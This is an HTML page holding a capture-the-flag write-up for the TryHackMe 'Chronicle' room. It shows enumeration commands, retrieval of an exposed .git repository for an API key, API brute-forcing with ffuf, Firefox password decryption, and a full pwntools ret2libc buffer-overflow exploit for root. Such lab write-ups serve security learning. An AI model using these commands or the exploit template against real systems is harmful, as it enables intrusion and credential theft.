<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta content="IE=edge" http-equiv="X-UA-Compatible">
  <meta content="width=device-width,initial-scale=1" name="viewport">
  <meta content="This website is owned to drf0x with great writeups and more!" name="description">
  <meta name="google" content="notranslate" />
  <meta content="developped by drf0x" name="author">
  <meta itemProp="image" content="./assets/Hacker.gif"/>
  <meta name="msapplication-tap-highlight" content="no">
  <meta name="og:image" content="https://drf0x.github.io/assets/Hacker.gif">
  <meta content="https://drf0x.github.io/assets/Hacker.gif" name="twitter:image:src" />

  <link rel="apple-touch-icon" sizes="180x180" href="./assets/Hacker.gif">
  <link href="./assets/Hacker.gif" rel="icon">

  <title>Chronicle</title>  

<link href="./main.3f6952e4.css" rel="stylesheet"></head>

<body class="minimal" >
  <body style="background-color: black;">

    <div class="bg-animation">
        <div id="stars"></div>
        <div id="stars2"></div>
        <div id="stars3"></div>
        <div id="stars4"></div>
    </div>

</body>
<div id="site-border-left"></div>
<div id="site-border-right"></div>
<div id="site-border-top"></div>
<div id="site-border-bottom"></div>
<header style="position: relative;width: 100%;z-index: 1000;">
  <nav class="white-text-container" style="height: 110px;background-color: rgba(0, 0, 0, 0); opacity: .9; padding-top: 20px;padding-bottom: 20px;">
    <div class="container">
        <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse" aria-expanded="false">
          <span class="sr-only">Toggle navigation</span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>

        <div class="collapse navbar-collapse" id="navbar-collapse">

          <ul class="nav navbar-nav " style="margin-top: 32px;">
            <li><a href="./index.html" title="">&nbsp;&nbsp;&nbsp;H̴̡̛̞̟̔̊̑̐̅̈́͗͘ǫ̷̩͇̤̲̾͒̾̑̃̌̒̔m̸̦͓̀̌̓ę̸͍̮̖̳͕̐ͅ</a></li>          <!-- Home -->
            <li><a href="./production.html" title="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;P̵̙̭͈͇̭̮͉͍̥̐̓͑̓͂̃͝ŕ̶̢̢̫͕̯͇̳̦͖̼o̵͙͍̝͙̱̽̓͗́̍̎̄d̵̡̮̪͉͚̘͇͍͈̖̊̋̈́́̀͆ư̵̡̢͎̙͓͊̀̂̈̀͌̓̍̉c̸̢̓̌͒̀̊t̵͈̝̖͛ị̵̯̼̮̠̆̀͝ͅo̷̧̝̱̲̞̳̰̥̭̍̏́͌ǹ̷̠̙͔̙̜̽̆͐͂̉̚͝͝</a></li>          <!-- Production -->
            <li><a href="./mixmast.html" title="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;M̷̩̳͎̞̬̭͑́̔̍i̸̛̯̗̫̓̀͑́̇͑̈́̃́x̵͎̓̋̄̍͐̂̓̽͝ ̵̧̦̞̪̰͈̪͙̗̔͑̃͒́a̶̱̗̭̩̜̲͚̗̙͌̕ͅn̵̻̰̗̜͒d̶̢̨̨̮͖͕̤͓̝͆̉̽̄̎͂̉̀͝ ̴̨̤̪̖̦̇̈́̒̌̕M̷͈̮̹̼̲͑͆a̷̼̹͙̍̀s̷̳͑̈́t̸̝̠͈̼̬̻̓̊̏͗ḙ̵̼̱͚̆͛͜r̸̢̭͈͖̝̩̈́͋͌̉̑͊̒̋̑̈́i̶̺͓̘̬̭̟͔͎̽͆͂͌̔ǹ̷̛͓̈́̀̒͗͘̕̚͝ğ̷͉͂̋͂͑̈́͌͠</a></li>          <!-- Mix and Mastering -->
            <li><a href="./djmix.html" title="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Ď̶̡̩̯̯̪͖̌̎J̸̨̹̤̗̺͍̇͊̇̎̿͐͂̕͝ ̵̲̗̼̩͎̹͑͒̌̍̌͗̓̇͠͝ͅM̴̨͕̘̈́͂͐͆̓̈̚͠͝i̵̭͉͈͗́x̵̨̪̦̰̌̽̉͆̚͠é̵̛̬̣͙̘̩͖̿̃͆̍̓͂̄̇s̶̲͉̻̗̟̩͓̀͆̽́͂̃̔̕͜͝</a></li>          <!-- DJ Mixes -->
            <li><a href="./writeups.html" title="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;W̴̢̘̞̦̮̙̜̤̍̒r̶̫̼̻͈̼̃̎ȋ̸̛͙̦͔͓̬̅͋̄̋̉͠͠ẗ̶̡̩̙͚̺̼́ē̵̛̱̣̄͒͑̐̚̕̕u̴̢̨̦͕̺͖͐̐͆̔͜͝p̷̪͒̀̈s̶̨̧̝͙͕̬̏</a></li>          <!-- Writeups -->
            <li><a href="./websites.html" title="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;W̶̯͓͍͕͚̘̹̬̔͜e̷̡͇̥͎̓b̶̡͈̦̟̯͋̅͆͗̚͝s̶̪͂̓̆̓̊̾̂̉̑̊i̸̛̘̟̯͒̃̋t̴̡̛̹̦̭̩̞̻͔͜ę̴̝̭̺̜̫̖̖͕͖̐͒̌̉̂́s̴̹̘̻͖̮͎͎̙̔̄̽̚</a></li>          <!-- Websites -->
            <li><a href="./socials.html" title="">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;S̴͇͓̝̺̰̭̰̫̈͜͜o̶̺̮͉̜̤̝̱̻͑͐͊͐̈́͘c̸͈̞̝̈́͋͐̾̀͘̕ị̷̢̣̠͙̒̈͂͜a̷̛̳̙̹̫̅̆͗̊͠͝ļ̶̈s̵̼͓͋̄̿̔̉̂̉͝</a></li>          <!-- Socials -->
          </ul>
          <!--      
         <div class="locate" style="float: right;">
         <script src="https://tryhackme.com/badge/172872"></script>
    -->  
    </div>
      </div> 
    </div>
  </nav>
</header>
  <div class="hero-full-container background-image-container white-text-container" >
    <div class="container">
      <div class="row">
        <div class="col-xs-12">
          <div class="hero-full-wrapper">
            <div class="text-content mytext">
              <h1>Chronicle<br>
                <font size=4>Hacked by <font color=#A33>K̴̥̘͚̲̤̳͋̐͗̄͆̒͋̈ą̴̞̤̹̩͚́̑̃̔͊̕̕͠ļ̴̛̭̥̰̤̠̱̥̺̌̐̓̔̅͘͝ȋ̵̜̜̗̉̈</font></font>
                <font size=2> 02/10/2021</font>
                <div class="paragragh">
                  

                  <body><br /><br />                      <font color=#A33>
                    <br />𝕋𝕠𝕕𝕒𝕪 𝕨𝕖 𝕒𝕣𝕖 𝕙𝕒𝕔𝕜𝕚𝕟𝕘 𝕒 𝕞𝕖𝕕𝕚𝕦𝕞 𝕝𝕖𝕧𝕖𝕝 𝕓𝕠𝕩 𝕠𝕟 𝕥𝕣𝕪𝕙𝕒𝕔𝕜𝕞𝕖, 𝕥𝕙𝕚𝕤 𝕓𝕠𝕩 𝕚𝕟𝕧𝕠𝕝𝕧𝕖𝕤 𝕖𝕟𝕦𝕞𝕖𝕣𝕒𝕥𝕚𝕟𝕘 𝕥𝕨𝕠 𝕙𝕥𝕥𝕡 𝕤𝕚𝕥𝕖𝕤 𝕥𝕠 𝕗𝕚𝕟𝕕 𝕒 𝕘𝕚𝕥 𝕣𝕖𝕡𝕠𝕤𝕚𝕥𝕠𝕣𝕪 𝕨𝕙𝕚𝕔𝕙 𝕔𝕠𝕟𝕥𝕒𝕚𝕟𝕤 𝕒𝕟 𝕒𝕡𝕚 𝕜𝕖𝕪 𝕦𝕤𝕖𝕕 𝕥𝕠 𝕒𝕦𝕥𝕙𝕖𝕟𝕥𝕚𝕔𝕒𝕥𝕖 𝕗𝕠𝕣𝕘𝕠𝕥 𝕡𝕒𝕤𝕤𝕨𝕠𝕣𝕕 𝕡𝕒𝕘𝕖 𝕥𝕙𝕖𝕟 𝕓𝕣𝕦𝕥𝕖 𝕗𝕠𝕣𝕔𝕚𝕟𝕘 𝕦𝕤𝕖𝕣𝕟𝕒𝕞𝕖𝕤 𝕥𝕠 𝕘𝕖𝕥 𝕤𝕤𝕙 𝕔𝕣𝕖𝕕𝕖𝕟𝕥𝕚𝕒𝕝𝕤. 𝕋𝕙𝕖𝕟 𝕕𝕖𝕔𝕣𝕪𝕡𝕥𝕚𝕟𝕘 𝕒 𝕗𝕚𝕣𝕖𝕗𝕠𝕩 𝕕𝕖𝕗𝕒𝕦𝕝𝕥 𝕣𝕖𝕝𝕖𝕒𝕤𝕖 𝕥𝕠 𝕘𝕖𝕥 𝕔𝕣𝕖𝕕𝕤 𝕗𝕠𝕣 𝕒𝕟𝕠𝕥𝕙𝕖𝕣 𝕦𝕤𝕖𝕣 𝕗𝕚𝕟𝕒𝕝𝕝𝕪 𝕗𝕚𝕟𝕕𝕚𝕟𝕘 𝕒 𝕡𝕣𝕠𝕘𝕣𝕒𝕞 𝕥𝕙𝕒𝕥 𝕨𝕖 𝕔𝕒𝕟 𝕣𝕦𝕟 𝕒𝕟𝕕 𝕦𝕤𝕚𝕟𝕘 𝕒 𝕓𝕦𝕗𝕗𝕖𝕣 𝕠𝕧𝕖𝕣𝕗𝕝𝕠𝕨 𝕥𝕠 𝕘𝕖𝕥 𝕦𝕤 𝕣𝕠𝕠𝕥.</p><br>
                  </font><br /><br /><br />Difficulty: <font color=orange> Medium</font><br /><br /><br />Points: 60<br /><br /><br />Room Link: <a href="https://tryhackme.com/room/chronicle"><font color=grey>Click Here</font></a><br /><br /><br /><br />
  <br><br><br><br><br><br>
  <br />Starting off with nmap<br /><br /><span class="highlight">nmap -v -sV -sC -oA nmap chronicle.thm</span><br /><br /><br />22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br />| ssh-hostkey: <br />|   2048 b2:4c:49:da:7c:9a:3a:ba:6e:59:46:c2:a9:e6:a2:35 (RSA)<br />|   256 7a:3e:30:70:cf:32:a4:f2:0a:cb:2b:42:08:0c:19:bd (ECDSA)<br />|_  256 4f:35:e1:33:96:84:5d:e5:b3:75:7d:d8:32:18:e0:a8 (ED25519)<br />80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))<br />| http-methods: <br />|_  Supported Methods: OPTIONS HEAD GET POST<br />|_http-server-header: Apache/2.4.29 (Ubuntu)<br />|_http-title: Site doesn't have a title (text/html).<br />8081/tcp open  http    Werkzeug httpd 1.0.1 (Python 3.6.9)<br />| http-methods: <br />|_  Supported Methods: OPTIONS GET HEAD<br />|_http-server-header: Werkzeug/1.0.1 Python/3.6.9<br />|_http-title: Site doesn't have a title (text/html; charset=utf-8).<br />Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br /><br /><br />Looks like just http runnin on 80 and 8081 with ssh on 22<br /><br />Enumeration on <a href="http://chronicle.thm:8081">http://chronicle.thm:8081</a> I found a login page then a /forget page which led me to this<br /><br /><br /><img src="chronicle/101-1.png" alt="chronicle/101-1.png" /><br /><br /><br />Using burp to intecept the POST request we get this<br /><br /><br /><img src="chronicle/101-2.png" alt="chronicle/101-2.png" /><br /><br /><br />Looks like were missing the api key. Also looking through the source code I found /static/js/forget.js which points out this<br /><br /><br /><img src="chronicle/101-3.png" alt="chronicle/101-3.png" /><br /><br /><br />So it seems that having no api key stops the funitionality. So lets find that key!<br /><br />Lets go back to gobuster on port 80<br /><br /><span class="highlight">gobuster dir -u chronicle.thm -w /usr/share/wordlists/dirb/common.txt -t 20 -x php,html,bak,txt,db,zip</span><br /><br /><br /><img src="chronicle/101-4.png" alt="chronicle/101-4.png" /><br /><br /><br />/old lookings intresting, lets run another gobuster on it<br /><br /><span class="highlight">ffuf -u <a href="http://chronicle.thm/old/FUZZ">http://chronicle.thm/old/FUZZ</a> -w raft-large-directories-lowercase.txt</span><br /><br />Cool! we got a .git repository, lets grab it<br /><br /><span class="highlight">wget --recursive <a href="http://chronicle.thm/old/.git">http://chronicle.thm/old/.git</a> --continue</span><br /><br />First thing I did was check the git log<br /><br /><span class="highlight">git log</span><br /><br /><br /><img src="chronicle/101-5.png" alt="chronicle/101-5.png" /><br /><br /><br />Cool we got some commit hashes, lets check them out<br /><br /><span class="highlight">git show cd0375717551c8c8287a53b78b014b7d7e4da3bb</span><br /><br /><br /><img src="chronicle/101-6.png" alt="chronicle/101-6.png" /><br /><br /><br />Cool we got a api key, lets use it!<br /><br />Lets now send the intecepted POST request to repeater and see what we get<br /><br /><br /><img src="chronicle/101-7.png" alt="chronicle/101-7.png" /><br /><br /><br />Okay cool it work but seems like we dont have the right username. After trying usernames and words I found around nothing would work so I decided to brute force it!<br /><br /><span class="highlight">ffuf -w /opt/SecLists/Passwords/Common-Credentials/10k-most-common.txt -X POST -d '{"key":"7454c262d0d5a3a0c0b678d6c0dbc7ef"}' -u <a href="http://chronicle.thm:8081/api/FUZZ">http://chronicle.thm:8081/api/FUZZ</a> -fw 2</span><br /><br /><br /><img src="chronicle/101-8.png" alt="chronicle/101-8.png" /><br /><br /><br />We get a hit, lets check it out<br /><br /><br /><img src="chronicle/101-9.png" alt="chronicle/101-9.png" /><br /><br /><br />Awesome we got some creds, lets try it on ssh!<br />tommy : {Redacted}<br /><br /><br /><img src="chronicle/101-10.png" alt="chronicle/101-10.png" /><br /><br /><br />Cool we got user! now lets go after root<br /><br />Okay so after running linpeas.sh I didn't really find anything intresting so I starting looking in common places when I found .mozilla in carlJ's home dir. cd'ing into it we see there is firefox within it, wonder if we can use a firefox dycrypter to dump some username and passwords.<br /><br /><br /><img src="chronicle/101-11.png" alt="chronicle/101-11.png" /><br /><br /><br />The script ill be using is firefox_decrypt.py <br /><a href="https://github.com/unode/firefox_decrypt">https://github.com/unode/firefox_decrypt</a><br /><br />First set up a http server on attacking host<br /><br /><span class="highlight">python3 -m http.server</span><br /><br />Then bring over the release file<br /><br /><span class="highlight">wget --recursive chronicle.thm:8000/0ryxwn4c.default-release --continue</span><br /><br /><span class="highlight">python3 /home/kali/THM/Chronicle/firefox_decrypt/firefox_decrypt.py 0ryxwn4c.default-release</span><br /><br /><br /><img src="chronicle/101-12.png" alt="chronicle/101-12.png" /><br /><br /><br />I got promted with a password, I did basic passwords till funny enough password1 worked<br /><br /><br /><img src="chronicle/101-13.png" alt="chronicle/101-13.png" /><br /><br /><br />Cool we got a password<br />carlj : {Redacted}<br /><br />Lets use to ssh in!<br /><br /><br /><img src="chronicle/101-14.png" alt="chronicle/101-14.png" /><br /><br /><br />Once ssh in I went into Mailing and found this<br /><br /><br /><img src="chronicle/101-15.png" alt="chronicle/101-15.png" /><br /><br /><br />seems to be some sort of script so ran it to see what it was<br /><br /><br /><img src="chronicle/101-16.png" alt="chronicle/101-16.png" /><br /><br /><br />looks like we input some test and then it ends, the instresting part about this script is “limit 80”. I tried to see if I could break this by putting more than 80 characters to see if we get an error or not.<br /><br /><br /><img src="chronicle/101-17.png" alt="chronicle/101-17.png" /><br /><br /><br />Cool we got a Sgmentation fault meaning this is most likley exposed to a buffer overflow<br />Lets get some info to create a expoit script to overlow it<br /><br /><span class="highlight">ldd smail</span><br /><br /><br /><img src="chronicle/101-18.png" alt="chronicle/101-18.png" /><br /><br /><br />The base address of libc is 0x00007ffff79e2000<br /><br /><span class="highlight">strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh</span><br /><br /><br /><img src="chronicle/101-19.png" alt="chronicle/101-19.png" /><br /><br /><br />base is 1b3e1a<br /><br /><span class="highlight">readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system</span><br /><br /><br /><img src="chronicle/101-20.png" alt="chronicle/101-20.png" /><br /><br /><br />The offset of system from the libc base is 0x4f550<br /><br /><span class="highlight">ROPgadget --binary smail | grep rdi</span><br /><br /><br /><img src="chronicle/101-21.png" alt="chronicle/101-21.png" /><br /><br /><br />objdump -d smail | grep ret<br /><br /><br /><img src="chronicle/101-22.png" alt="chronicle/101-22.png" /><br /><br /><br />Here the ret address is 400556<br /><br />Exploit:<br /><br /><div class="codebox"><div class="codebox">from&nbsp;pwn&nbsp;import&nbsp;*<br /><br />p&nbsp;=&nbsp;process('./smail')<br /><br />base&nbsp;=&nbsp;0x7ffff79e2000<br />sys&nbsp;=&nbsp;base&nbsp;+&nbsp;0x4f550<br />binsh&nbsp;=&nbsp;base&nbsp;+&nbsp;0x1b3e1a<br /><br />rop_rdi&nbsp;=&nbsp;0x4007f3<br /><br />payload&nbsp;=&nbsp;b'A'&nbsp;*&nbsp;72<br />payload&nbsp;+=&nbsp;p64(0x400556)<br />payload&nbsp;+=&nbsp;p64(rop_rdi)<br />payload&nbsp;+=&nbsp;p64(binsh)<br />payload&nbsp;+=&nbsp;p64(sys)<br />payload&nbsp;+=&nbsp;p64(0x0)<br /><br /><br />p.clean()<br />p.sendline("2")<br />p.sendline(payload)<br />p.interactive()<br /><br /><br /></div></div><br /><br /><br /><img src="chronicle/101-23.png" alt="chronicle/101-23.png" /><br /><br /><br />And just like that we got root!<br /><br /><br /><br /><br /><br /></body>

                </div>
              </h1>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

<script>
  document.addEventListener("DOMContentLoaded", function (event) {
     type();
     movingBackgroundImage();
  });
</script>


<script type="text/javascript" src="./main.70a66962.js"></script></body>

</html>